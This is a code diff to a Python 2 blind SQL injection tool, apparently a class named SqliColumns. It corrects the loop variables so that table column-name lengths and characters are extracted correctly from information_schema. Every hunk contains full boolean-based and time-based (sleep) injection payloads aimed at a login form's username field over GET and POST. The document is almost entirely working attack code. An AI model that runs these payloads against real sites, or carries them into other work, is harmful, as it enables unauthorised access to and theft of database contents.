@@ -82,7 +82,7 @@ class SqliColumns(SqliTables):
                             payload = "username=admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                 i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                             if self.Data.GetBuildData(payload, self.len) == 0:
-                                columns_name_len = i
+                                columns_name_len = j
                                 break
 
                         logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
@@ -95,7 +95,7 @@ class SqliColumns(SqliTables):
                                     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                     i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                                 if self.Data.GetBuildData(payload, self.len) == 0:
-                                    columns_name += chr(int(j))
+                                    columns_name += chr(int(k))
                                     break
 
                         logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
@@ -125,10 +125,10 @@ class SqliColumns(SqliTables):
                                 i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                             if self.Data.GetTimeData(payload, self.time) == 0:
-                                columns_name_len = i
+                                columns_name_len = j
                                 break
 
-                        logger.info("Columns name length sqli success...The database_len is %d..." % columns_name_len)
+                        logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
                         print "[*] columns_name_len: %d" % columns_name_len
 
                         # 然后注columns名字
@@ -139,7 +139,7 @@ class SqliColumns(SqliTables):
                                     i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                                 if self.Data.GetTimeData(payload, self.time) == 0:
-                                    columns_name += chr(int(j))
+                                    columns_name += chr(int(k))
                                     break
 
                         logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
@@ -207,7 +207,7 @@ class SqliColumns(SqliTables):
                                 "username": "admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                     i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                             if self.Data.PostBuildData(payload, self.len) == 0:
-                                columns_name_len = i
+                                columns_name_len = j
                                 break
 
                         logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
@@ -220,7 +220,7 @@ class SqliColumns(SqliTables):
                                     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                     i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                                 if self.Data.PostBuildData(payload, self.len) == 0:
-                                    columns_name += chr(int(j))
+                                    columns_name += chr(int(k))
                                     break
 
                         logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
@@ -252,7 +252,7 @@ class SqliColumns(SqliTables):
                                     i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                             if self.Data.PostTimeData(payload, self.time) == 0:
-                                columns_name_len = i
+                                columns_name_len = j
                                 break
 
                         logger.info("Columns name length sqli success...The database_len is %d..." % columns_name_len)
@@ -266,7 +266,7 @@ class SqliColumns(SqliTables):
                                     i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                                 if self.Data.PostTimeData(payload, self.time) == 0:
-                                    columns_name += chr(int(j))
+                                    columns_name += chr(int(k))
                                     break
 
                         logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
